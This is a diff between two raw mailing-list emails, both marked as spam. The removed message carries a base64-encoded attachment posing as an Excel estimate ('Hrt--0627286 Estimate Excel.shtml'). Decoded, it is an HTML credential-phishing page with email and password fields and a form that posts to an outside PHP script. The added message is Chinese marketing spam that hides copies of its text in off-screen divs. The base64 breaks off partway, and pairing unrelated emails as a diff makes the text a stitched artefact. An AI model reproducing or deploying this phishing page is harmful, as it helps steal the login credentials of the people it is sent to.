@@ -2,96 +2,105 @@ Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
 X-Original-To: lists+industrypack-devel@lfdr.de
 Delivered-To: lists+industrypack-devel@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id 13BCE6D563A
-	for <lists+industrypack-devel@lfdr.de>; Tue,  4 Apr 2023 03:45:03 +0200 (CEST)
-Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
-	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
+	by mail.lfdr.de (Postfix) with ESMTPS id 35A9B6D571F
+	for <lists+industrypack-devel@lfdr.de>; Tue,  4 Apr 2023 05:19:12 +0200 (CEST)
+Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
+	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
 	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
-	id 1pjVjK-0000eT-Nx
+	id 1pjXCR-0000bt-Pq
 	for lists+industrypack-devel@lfdr.de;
-	Tue, 04 Apr 2023 01:45:01 +0000
+	Tue, 04 Apr 2023 03:19:10 +0000
 Received: from [172.30.20.202] (helo=mx.sourceforge.net)
- by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
+ by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
- (envelope-from <sara@vietdot.com>) id 1pjVjJ-0000e2-8X
- for industrypack-devel@lists.sourceforge.net;
- Tue, 04 Apr 2023 01:45:00 +0000
+ (envelope-from <bounce-2084-34803668-1880-248@a.07552.net>)
+ id 1pjXCQ-0000bn-7C for industrypack-devel@lists.sourceforge.net;
+ Tue, 04 Apr 2023 03:19:09 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
- d=sourceforge.net; s=x; h=Content-Type:List-Unsubscribe:MIME-Version:
- Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
+ d=sourceforge.net; s=x; h=Subject:Content-Type:Content-Transfer-Encoding:
+ MIME-Version:List-Unsubscribe:Message-ID:Reply-to:From:To:Date:Sender:Cc:
  Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
  Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
  List-Help:List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=LXokA8E+jQp8Q69aM15kqFJUNHhAPKIhB8rh074YY6c=; b=m240HfCyZ7R5ul7S4AeyFvfgmn
- HhSJhmGvnY/meGXzXnpTcfN6riph9LWewJk36PtoTpqfQV4+HJGMBcc0nx4YsQOzFFVdTZZbzDoQg
- yB6YmHvRtVfk88tLR0F/YlIbc0H4yGPXE8XYUkUnnfRyJ2NAS8ay4pHaKVpd48JejAXk=;
+ bh=pcpb/97uhUC8qk7zU70pgSaz43ILBJ73TWF0XxC+qAA=; b=FYUHRNns8qH6Wf2Ms0DiIbjptA
+ FWel0/ZRu918iVNFdbcedGnfBM1821STKOfI81FPP4Qqy+AEqDpiia6LQ6syqbaJ7xPVjnvqkJSk3
+ qn+DcuXbyufHZcMYDZbFYX7mKBhYGlf4xARoTfpuOXEaj6vilYkCfwoRFRMTybnu2P5I=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
- h=Content-Type:List-Unsubscribe:MIME-Version:Message-ID:Date:Subject:To:
- From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
+ h=Subject:Content-Type:Content-Transfer-Encoding:MIME-Version:
+ List-Unsubscribe:Message-ID:Reply-to:From:To:Date:Sender:Cc:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Subscribe:
  List-Post:List-Owner:List-Archive;
- bh=LXokA8E+jQp8Q69aM15kqFJUNHhAPKIhB8rh074YY6c=; b=EMimx9cNITkO4eTEwkUmlMsL1G
- 7I1TjHnqCHhr6R2Hw8z5l+51P+MWzwP6GmUFjZuKLqBr6ELtLiZffVIOiXmJjlLJ3CysAQinQkaFJ
- 81xe5aM+05TjdtGtt6dnXitAK6Vvnq3efKvTnJZe32tdBhXMeWuB+vi//enw3DYYXUZ0=;
-Received: from stella0386.vietdot.com ([88.209.253.161])
- by sfi-mx-2.v28.lw.sourceforge.com with esmtps
- (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
- id 1pjVjH-0000E2-DF for industrypack-devel@lists.sourceforge.net;
- Tue, 04 Apr 2023 01:45:00 +0000
-DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=vietdot.com;
- h=From:To:Subject:Date:Message-ID:MIME-Version:List-Unsubscribe:Content-Type;
- i=sara@vietdot.com; bh=Lth/9UU42QAyVTz9RENjJnDPt1w=;
- b=IEBZStyscM4fKhynZJMv1QmsjGGPD16/GBRyh0qcZ7E+1N+8fgMwL8PDWMMY65gqlOZtZmyV4YaA
- CCgvHlw2yEeJBjlIWcZLi8TDIzsRjg7Q+vwym0gqt7KVrzWpWmjPJLqMj0WIYJmihxAEofsui8Vf
- cYq4kNl76lZtlaU2GeTL0NUoA3Vv6nDr4lRT/cN5zLtwOn3v3nwm0zS0oW1w3JZINBbVi2JCVyip
- xJ8pTztxLUAkSx/f5ewfx1agTOrXhJb4kt2ykfB1Y6XKq2ff0KoJGp5xeY2a0UdKEavxGgBLmEZr
- u8IaE6WVgNXlWIi4uioVlcHR1VTuvaz53AezVw==
-DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=vietdot.com;
- b=CmIABTZyPXmimS1lD4C4UqlAedOzzRQ5TMHtECgcINqJhg+P3c1fAUtkMyIzutpqJ4qZ+VuzdXn1
- lddk/bd7U8weMdihgGsp7sSRV7qDPki/Kim6N6wObs4DnzL6V/GrCkFr1/cRMAqWkt8lUE5N+OIz
- 8cGAcM3vKxio7MDryCklEhZKT5VYK0NVQnO5b4k7S/DjkOBrifkdltNlHTLef5VvJzMFpFiZXptx
- IQDmzK1pgOw7kfwIafe/ZBld8gnzXbINX9lMXkRBMMsuq5bf6wciBVyZ5Tv9H1A73pjjCdrJrPGr
- h5Wh3ca5B2iytBtP+LpfIi3DRb6aWEqYt1LOXA==;
-From: VI Purchasing<sara@vietdot.com>
-To: industrypack-devel@lists.sourceforge.net
-Date: 04 Apr 2023 03:24:32 +0200
-Message-ID: <20230404032432.BA0183A7EACD6B9B@vietdot.com>
+ bh=pcpb/97uhUC8qk7zU70pgSaz43ILBJ73TWF0XxC+qAA=; b=M/Eas6UqxkAqM9FSZxXFCs9Mqq
+ 5Dx2UF8e1Imvh+KBfEhWsJ6upNeMo1UiB96MZQfjcNSxqnSvqqVDBjkn4l4AcXx7IzOaklvi7Tcs8
+ qhqA29OEu/ay3/81N63+CpE8OzkJdWaSi7CJsxbO2KMoUHLfX7iASTZYnwBa9hR56j9Y=;
+Received: from [103.45.65.30] (helo=a.07552.net)
+ by sfi-mx-1.v28.lw.sourceforge.com with esmtp (Exim 4.95)
+ id 1pjXCO-00EGlG-Ob for industrypack-devel@lists.sourceforge.net;
+ Tue, 04 Apr 2023 03:19:09 +0000
+Received: by a.07552.net id h5ebio0e97cn for
+ <industrypack-devel@lists.sourceforge.net>;
+ Tue, 4 Apr 2023 03:19:00 +0000 (envelope-from
+ <bounce-2084-34803668-1880-248@a.07552.net>)
+Date: Tue, 4 Apr 2023 03:19:00 +0000
+To: "industrypack-devel@lists.sourceforge.net"
+ <industrypack-devel@lists.sourceforge.net>
+From: "mr.chen" <mxqczw0311@163.com>
+Message-ID: <00db267e6246df213f200729cef7d1db@103.45.65.30>
+X-Priority: 3
+X-Mailer: Email Sending System
+X-Complaints-To: test@test.com
+X-MessageID: MTB8fHx8MTcwNjA2fHx8fGluZHVzdHJ5cGFjay1kZXZlbEBsaXN0cy5zb3VyY2Vmb3JnZS5uZXR8fHx8OXx8fHwxfHx8fDA%3D
+X-Report-Abuse: <http://103.45.65.30/oem/report_abuse.php?mid=MTB8fHx8MTcwNjA2fHx8fGluZHVzdHJ5cGFjay1kZXZlbEBsaXN0cy5zb3VyY2Vmb3JnZS5uZXR8fHx8OXx8fHwxfHx8fDA%3D>
 MIME-Version: 1.0
-Content-Type: multipart/mixed;
- boundary="----=_NextPart_000_0012_1B5302E6.DA4F00EA"
-X-Spam-Score: 6.1 (++++++)
-X-Spam-Report: Spam detection software,
- running on the system "util-spamd-1.v13.lw.sourceforge.com", 
+X-Spam-Score: 8.5 (++++++++)
+X-Spam-Report: Spam detection software, running on the system "util-spamd-2.v13.lw.sourceforge.com",
  has identified this incoming email as possible spam.  The original
  message has been attached to this so you can view it or label
  similar future email.  If you have any questions, see
  the administrator of that system for details.
- Content preview: This email was intended for industrypack-devel of
- lists.sourceforge.net
- Content analysis details:   (6.1 points, 6.0 required)
- pts rule name              description
+ 
+ Content preview:  Untitled document 让外贸成交更简单，我们可以帮到您以下几点:
+    1、八种方式帮助您找到全球精准目标 
+ 
+ Content analysis details:   (8.5 points, 6.0 required)
+ 
+  pts rule name              description
  ---- ---------------------- --------------------------------------------------
- 2.5 URIBL_DBL_MALWARE      Contains a malware URL listed in the Spamhaus
- DBL blocklist [URIs: vietdot.com]
- 3.6 RCVD_IN_SBL_CSS        RBL: Received via a relay in Spamhaus SBL-CSS
- [88.209.253.161 listed in zen.spamhaus.org]
- 0.1 URIBL_CSS_A Contains URL's A record listed in the Spamhaus CSS
- blocklist [URIs: vietdot.com]
- -0.0 SPF_PASS               SPF: sender matches SPF record
- 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
- 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
- 0.0 HTML_MESSAGE           BODY: HTML included in message
- -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
- envelope-from domain
- -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
- 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
- valid
- -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
- author's domain
-X-Headers-End: 1pjVjH-0000E2-DF
-Subject: [Industrypack-devel] FW: Hrt--0627286 Estimate
+  3.6 RCVD_IN_PBL            RBL: Received via a relay in Spamhaus PBL
+                             [103.45.65.30 listed in zen.spamhaus.org]
+  1.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
+                             [103.45.65.30 listed in dnsbl-1.uceprotect.net]
+  1.0 HK_RANDOM_REPLYTO      Reply-To username looks random
+  0.8 HK_RANDOM_FROM         From username looks random
+  0.2 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level
+                             mail domains are different
+  0.2 FREEMAIL_REPLYTO_END_DIGIT Reply-To freemail username ends in
+                             digit
+                             [mxqczw0311[at]163.com]
+  0.0 SPF_NONE               SPF: sender does not publish an SPF Record
+  0.0 FREEMAIL_FROM          Sender email is commonly abused enduser mail
+                             provider
+                             [mxqczw0311[at]163.com]
+  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
+  0.0 NUMERIC_HTTP_ADDR      URI: Uses a numeric IP address in URL
+  0.0 NORMAL_HTTP_TO_IP      URI: URI host has a public dotted-decimal IPv4
+                              address
+  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
+  0.0 HTML_MESSAGE           BODY: HTML included in message
+  0.2 FREEMAIL_FORGED_FROMDOMAIN 2nd level domains in From and
+                             EnvelopeFrom freemail headers are
+                             different
+  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
+  0.0 T_HK_NAME_FM_MR_MRS    No description available.
+  0.0 SPOOFED_FREEMAIL_NO_RDNS From SPOOFED_FREEMAIL and no rDNS
+  0.0 SPOOFED_FREEMAIL       No description available.
+  0.0 TVD_SPACE_RATIO_MINFP  Space ratio (vertical text obfuscation?)
+X-VA-Spam-Flag: YES
+X-Spam-Flag: YES
+X-Headers-End: 1pjXCO-00EGlG-Ob
+Subject: [SPAM] 让业务员有事可做，完善贵司业务体系。
 X-BeenThere: industrypack-devel@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -103,141 +112,114 @@ List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
 List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
  <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
+Reply-To: "mr.chen" <mxqczw0311@163.com>
+Content-Type: multipart/mixed; boundary="===============3749842262491050298=="
 Errors-To: industrypack-devel-bounces@lists.sourceforge.net
 
-This is a multi-part message in MIME format.
-
-------=_NextPart_000_0012_1B5302E6.DA4F00EA
-Content-Type: text/html;
-	charset="iso-8859-1"
+--===============3749842262491050298==
 Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html; charset="utf-8"
 
-<HTML><HEAD>
-<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19699"></HEAD>
-<body><SPAN style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Helvetica, sans-s=
-erif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WE=
-IGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2;=
- LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0=
-px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text=
--stroke-width: 0px; text-decoration-thickness: initial; text-decoration-sty=
-le: initial; text-decoration-color: initial">
-This</SPAN>
- <SPAN style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif=
-; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none=
-; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; W=
-IDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-CO=
-LOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; fo=
-nt-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-th=
-ickness: initial; text-decoration-style: initial;=20
-text-decoration-color: initial"></SPAN>
-<BR aria-hidden=3Dtrue style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Helvet=
-ica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: no=
-ne; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS: 2;=
- WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEX=
-T-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -=
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-dec=
-oration-style: initial; text-decoration-color:=20
-initial"><SPAN style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Helvetica, san=
-s-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT=
--WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS: 2; WIDOWS:=
- 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
-: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-t=
-ext-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-=
-style: initial; text-decoration-color: initial">
-email was intended for industrypack-devel of lists.sourceforge.net</SPAN></=
-BODY></HTML>
-------=_NextPart_000_0012_1B5302E6.DA4F00EA
-Content-Type: application/octet-stream; name="Hrt--0627286 Estimate Excel.shtml"
-Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="Hrt--0627286 Estimate Excel.shtml"
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.=
+w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html>
+<head>
+<title>Untitled document</title>
+</head>
+<body>
+<div id=3D"_mcePaste" style=3D"position: absolute; left: -10000px; top: 0px=
+; width: 1px; height: 1px; overflow: hidden;"><span style=3D"font-size: 10p=
+x;">=E8=AE=A9=E5=A4=96=E8=B4=B8=E6=88=90=E4=BA=A4=E6=9B=B4=E7=AE=80=E5=8D=
+=95=EF=BC=8C=E6=88=91=E4=BB=AC=E5=8F=AF=E4=BB=A5=E5=B8=AE=E5=88=B0=E6=82=A8=
+=E4=BB=A5=E4=B8=8B=E5=87=A0=E7=82=B9:&nbsp;</span></div>
+<div id=3D"_mcePaste" style=3D"position: absolute; left: -10000px; top: 0px=
+; width: 1px; height: 1px; overflow: hidden;"><span style=3D"font-size: 10p=
+x;">1=E3=80=81=E5=85=AB=E7=A7=8D=E6=96=B9=E5=BC=8F=E5=B8=AE=E5=8A=A9=E6=82=
+=A8=E6=89=BE=E5=88=B0=E5=85=A8=E7=90=83=E7=B2=BE=E5=87=86=E7=9B=AE=E6=A0=87=
+</span></div>
+<div id=3D"_mcePaste" style=3D"position: absolute; left: -10000px; top: 0px=
+; width: 1px; height: 1px; overflow: hidden;"><span style=3D"font-size: 10p=
+x;">2=E3=80=81=E6=8C=96=E6=8E=98=E7=9B=AE=E6=A0=87=E5=A4=9A=E7=A7=8D=E8=81=
+=94=E7=B3=BB=E6=96=B9=E5=BC=8F=EF=BC=8C=E8=AF=86=E5=88=AB=E9=82=AE=E7=AE=B1=
+=E8=81=8C=E4=BD=8D=E4=BF=A1=E6=81=AF=EF=BC=8C=E7=B2=BE=E5=87=86=E5=8F=91=E9=
+=80=81=E7=B2=BE=E7=BE=8E=E5=BC=80=E5=8F=91=E4=BF=A1</span></div>
+<div id=3D"_mcePaste" style=3D"position: absolute; left: -10000px; top: 0px=
+; width: 1px; height: 1px; overflow: hidden;"><span style=3D"font-size: 10p=
+x;">3=E3=80=81=E5=8F=8D=E9=A6=88=E5=AE=A2=E6=88=B7=E5=AF=B9=E9=82=AE=E4=BB=
+=B6=E7=9A=84=E8=A1=8C=E4=B8=BA=E4=BF=A1=E6=81=AF&nbsp;</span></div>
+<div id=3D"_mcePaste" style=3D"position: absolute; left: -10000px; top: 0px=
+; width: 1px; height: 1px; overflow: hidden;"><span style=3D"font-size: 10p=
+x;">4=E3=80=81=E7=AE=A1=E7=90=86=E8=90=A5=E9=94=80=E6=84=8F=E5=90=91=E5=AE=
+=A2=E6=88=B7 =E4=B8=BB=E5=8A=A8=E5=BC=80=E5=8F=91=E5=9B=BD=E5=A4=96=E7=B2=
+=BE=E5=87=86=E5=AE=A2=E6=88=B7=E3=80=82</span></div>
+<div id=3D"_mcePaste" style=3D"position: absolute; left: -10000px; top: 0px=
+; width: 1px; height: 1px; overflow: hidden;"><span style=3D"font-size: 10p=
+x;"><br /></span></div>
+<div id=3D"_mcePaste" style=3D"position: absolute; left: -10000px; top: 0px=
+; width: 1px; height: 1px; overflow: hidden;"><span style=3D"font-size: 10p=
+x;">=E8=AE=A9=E6=82=A8=E6=8A=8A=E7=B2=BE=E5=8A=9B=E9=9B=86=E4=B8=AD=E5=9C=
+=A8=E8=B0=88=E5=8D=95=E6=96=B9=E9=9D=A2=E4=B8=8A=E3=80=82</span></div>
+<div id=3D"_mcePaste" style=3D"position: absolute; left: -10000px; top: 0px=
+; width: 1px; height: 1px; overflow: hidden;"><span style=3D"font-size: 10p=
+x;">&nbsp;</span></div>
+<div id=3D"_mcePaste" style=3D"position: absolute; left: -10000px; top: 0px=
+; width: 1px; height: 1px; overflow: hidden;"><span style=3D"font-size: 10p=
+x;">=E6=AC=A2=E8=BF=8E=E6=84=9F=E5=85=B4=E8=B6=A3=E4=BA=86=E8=A7=A3=E3=80=
+=82</span></div>
+<div id=3D"_mcePaste" style=3D"position: absolute; left: -10000px; top: 0px=
+; width: 1px; height: 1px; overflow: hidden;"><span style=3D"font-size: 10p=
+x;">VX=EF=BC=9A14749355828</span></div>
+<div id=3D"_mcePaste" style=3D"position: absolute; left: -10000px; top: 0px=
+; width: 1px; height: 1px; overflow: hidden;"><span style=3D"font-size: 10p=
+x;"><br /></span></div>
+<div id=3D"_mcePaste" style=3D"position: absolute; left: -10000px; top: 0px=
+; width: 1px; height: 1px; overflow: hidden;"><span style=3D"font-size: 10p=
+x;">QQ=EF=BC=9A2788662455</span></div>
+<div><span style=3D"font-size: 10px;">=E8=AE=A9=E5=A4=96=E8=B4=B8=E6=88=90=
+=E4=BA=A4=E6=9B=B4=E7=AE=80=E5=8D=95=EF=BC=8C=E6=88=91=E4=BB=AC=E5=8F=AF=E4=
+=BB=A5=E5=B8=AE=E5=88=B0=E6=82=A8=E4=BB=A5=E4=B8=8B=E5=87=A0=E7=82=B9:&nbsp=
+;</span></div>
+<div><span style=3D"font-size: 10px;">1=E3=80=81=E5=85=AB=E7=A7=8D=E6=96=B9=
+=E5=BC=8F=E5=B8=AE=E5=8A=A9=E6=82=A8=E6=89=BE=E5=88=B0=E5=85=A8=E7=90=83=E7=
+=B2=BE=E5=87=86=E7=9B=AE=E6=A0=87</span></div>
+<div><span style=3D"font-size: 10px;">2=E3=80=81=E6=8C=96=E6=8E=98=E7=9B=AE=
+=E6=A0=87=E5=A4=9A=E7=A7=8D=E8=81=94=E7=B3=BB=E6=96=B9=E5=BC=8F=EF=BC=8C=E8=
+=AF=86=E5=88=AB=E9=82=AE=E7=AE=B1=E8=81=8C=E4=BD=8D=E4=BF=A1=E6=81=AF=EF=BC=
+=8C=E7=B2=BE=E5=87=86=E5=8F=91=E9=80=81=E7=B2=BE=E7=BE=8E=E5=BC=80=E5=8F=91=
+=E4=BF=A1</span></div>
+<div><span style=3D"font-size: 10px;">3=E3=80=81=E5=8F=8D=E9=A6=88=E5=AE=A2=
+=E6=88=B7=E5=AF=B9=E9=82=AE=E4=BB=B6=E7=9A=84=E8=A1=8C=E4=B8=BA=E4=BF=A1=E6=
+=81=AF&nbsp;</span></div>
+<div><span style=3D"font-size: 10px;">4=E3=80=81=E7=AE=A1=E7=90=86=E8=90=A5=
+=E9=94=80=E6=84=8F=E5=90=91=E5=AE=A2=E6=88=B7 =E4=B8=BB=E5=8A=A8=E5=BC=80=
+=E5=8F=91=E5=9B=BD=E5=A4=96=E7=B2=BE=E5=87=86=E5=AE=A2=E6=88=B7=E3=80=82</s=
+pan></div>
+<div><span style=3D"font-size: 10px;"><br /></span></div>
+<div><span style=3D"font-size: 10px;">=E8=AE=A9=E6=82=A8=E6=8A=8A=E7=B2=BE=
+=E5=8A=9B=E9=9B=86=E4=B8=AD=E5=9C=A8=E8=B0=88=E5=8D=95=E6=96=B9=E9=9D=A2=E4=
+=B8=8A=E3=80=82</span></div>
+<div><span style=3D"font-size: 10px;">&nbsp;</span></div>
+<div><span style=3D"font-size: 10px;">=E6=AC=A2=E8=BF=8E=E6=84=9F=E5=85=B4=
+=E8=B6=A3=E4=BA=86=E8=A7=A3=E3=80=82</span></div>
+<div><span style=3D"font-size: 10px;">VX=EF=BC=9A14749355828</span></div>
+<div><span style=3D"font-size: 10px;"><br /></span></div>
+<div><span style=3D"font-size: 10px;">QQ=EF=BC=9A2788662455</span></div>
 
-PGh0bWw+DQo8aGVhZD4NCgk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9
-ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPg0KCTxtZXRhIGh0dHAtZXF1aXY9Ilgt
-VUEtQ29tcGF0aWJsZSIgY29udGVudD0iSUU9ZWRnZSxjaHJvbWU9MSIgLz4NCgk8dGl0bGU+
-QURHIEZhc3RlbmVycyBJbmMuIDwvdGl0bGU+DQoNCgk8c3R5bGU+DQpib2R5LCBodG1sIHsg
-aGVpZ2h0OiAxMDAlO21hcmdpbjogMDsgZm9udC1mYW1pbHk6IEFyaWFsLCBIZWx2ZXRpY2Es
-IHNhbnMtc2VyaWY7DQp9DQoqIHsNCiAgYm94LXNpemluZzogYm9yZGVyLWJveDsNCn0NCi5i
-Zy1pbWFnZSB7DQogIC8qIFRoZSBpbWFnZSB1c2VkICovDQogIGJhY2tncm91bmQtaW1hZ2U6
-IHVybCgiaHR0cHM6Ly9pLnBpbmltZy5jb20vMjM2eC80Ni84NS8yZC80Njg1MmRkNWZhNTFi
-NjliZGY1Y2M1YzY1YzcxOGVkOS5qcGciKTsNCiAgIG9wYWNpdHk6IDAuNTsNCiAgLyogQWRk
-IHRoZSBibHVyIGVmZmVjdCAqLyBmaWx0ZXI6IGJsdXIoLXB4KTsgLXdlYmtpdC1maWx0ZXI6
-IGJsdXIoLXB4KTsNCiAgLyogRnVsbCBoZWlnaHQgKi8gaGVpZ2h0OiAxNTAlOyAvKiBDZW50
-ZXIgYW5kIHNjYWxlIHRoZSBpbWFnZSBuaWNlbHkgKi8NCiAgYmFja2dyb3VuZC1wb3NpdGlv
-bjogY2VudGVyOyBiYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVwZWF0OyBiYWNrZ3JvdW5kLXNp
-emU6IGNvdmVyOw0KfQ0KDQovKiBQb3NpdGlvbiB0ZXh0IGluIHRoZSBtaWRkbGUgb2YgdGhl
-IHBhZ2UvaW1hZ2UgKi8NCi5iZy10ZXh0IHsNCiAgYmFja2dyb3VuZDogIzE0M2IwODsNCiAg
-d2lkdGg6MzcwcHg7IGhlaWdodDo0NTBweDsgLXdlYmtpdC1ib3gtc2hhZG93OiAxcHggMXB4
-IDE1cHggMXB4ICMwMDAwMDA7DQogIGJveC1zaGFkb3c6IDFweCAxcHggMTVweCAxcHggIzAw
-MDAwMDsgYm9yZGVyLXJhZGl1czogMXB4IDI1cHggMXB4IDQwcHg7DQoNCiAgcG9zaXRpb246
-IGFic29sdXRlOyB0b3A6IDUwJTsgbGVmdDogNTAlOyB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgt
-NTAlLCAtNTAlKTsgei1pbmRleDogMjsgdGV4dC1hbGlnbjogY2VudGVyOw0KfQ0KaW5wdXRb
-dHlwZT1zdWJtaXRdIHsNCiAgd2lkdGg6MjkwcHg7IGhlaWdodDo0MHB4OyBmb250LWZhbWls
-eTogYXJpYWw7IGZvbnQtc2l6ZTogMTRweDsgY29sb3I6I0ZGRjsgYmFja2dyb3VuZC1jb2xv
-cjogIzA0ODlCMTsgYm9yZGVyOiBzb2xpZCAxcHggIzA0ODlCMTsgYm9yZGVyLXJhZGl1czog
-MnB4IDEwcHggMnB4IDEwcHg7DQogIC13ZWJraXQtYm94LXNoYWRvdzogMnB4IDJweCAxNXB4
-IDVweCAjMDAwMDAwOyBib3gtc2hhZG93OiAycHggMnB4IDE1cHggNXB4ICMwMDAwMDA7ICBm
-b250LXdlaWdodDpib2xkOw0KfQ0KaW5wdXRbdHlwZT1wYXNzd29yZF0gew0KICB3aWR0aDoy
-OTBweDsgaGVpZ2h0OjM1cHg7IGZvbnQtZmFtaWx5OiBhcmlhbDsgZm9udC1zaXplOiAxM3B4
-OyBib3JkZXItcmFkaXVzOiAzcHg7DQogIGNvbG9yOiMwMDAwMDA7IGJhY2tncm91bmQtY29s
-b3I6ICNGRkY7IGJvcmRlcjogc29saWQgMXB4ICNGRkY7IHBhZGRpbmc6IDEwcHg7DQogIH0N
-CmlucHV0W3R5cGU9ZW1haWxdIHsNCiAgd2lkdGg6MjkwcHg7IGhlaWdodDozNXB4OyBmb250
-LWZhbWlseTogYXJpYWw7IGZvbnQtc2l6ZTogMTNweDsgYm9yZGVyLXJhZGl1czogM3B4Ow0K
-ICBjb2xvcjojMDAwMDAwOyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGOyBib3JkZXI6IHNvbGlk
-IDFweCAjRkZGOyBwYWRkaW5nOiAxMHB4Ow0KICAgIH0NCjwvc3R5bGU+DQoNCg0KPC90ZD48
-L3RyPg0KDQo8dHI+PHRkIGhlaWdodD0iNzUlIiAgYmdjb2xvcj0iI0ZGRiI+DQo8ZGl2IGNs
-YXNzPSJiZy1pbWFnZSI+PC9kaXY+DQo8ZGl2IGNsYXNzPSJiZy10ZXh0Ij4NCg0KDQoJPHRh
-YmxlIGFsaWduPSJjZW50ZXIiIGNlbGxzcGFjaW5nPSIwIj4NCgk8dHI+PHRkIHN0eWxlPSJo
-ZWlnaHQ6MTBweDsiPjwvdGQ+PC90cj4NCg0KCQkJCQk8dHI+PHRkIHN0eWxlPSJoZWlnaHQ6
-OHB4OyI+PC90ZD48L3RyPg0KCQkJCQk8dHI+PHRkPg0KCQkJCQk8Zm9ybSBtZXRob2Q9InBv
-c3QiIGFjdGlvbj0iaHR0cHM6Ly9rYWRtb25sdGQuY29tL296ZW5pdGhncm91cHMvemVkMDAy
-LnBocCI+DQoJCQkJCTwvdGQ+PC90cj4NCgkJCQkJPHRyPjx0ZD4NCgkJCQkJCQkJPC9mb250
-Pg0KCQkJCQkJCTwvZGl2Pg0KCQkJCQk8L3RkPjwvdHI+DQoJCQkJCTx0cj48dGQgc3R5bGU9
-ImhlaWdodDo3cHg7Ij48L3RkPjwvdHI+DQoJCQkJCTx0cj48dGQ+DQoJCQkJCQkJPGRpdiBh
-bGlnbj0iY2VudGVyIj4NCgkJCQkJCQkJPGZvbnQgZmFjZT0iYXJpYWwiIHNpemU9IjEiIGNv
-bG9yPSIjRkZGIj4NCgkJCQkJCQkJCTxiPjwvYj4NCgkJCQkJCQkJPC9mb250Pg0KCQkJCQkJ
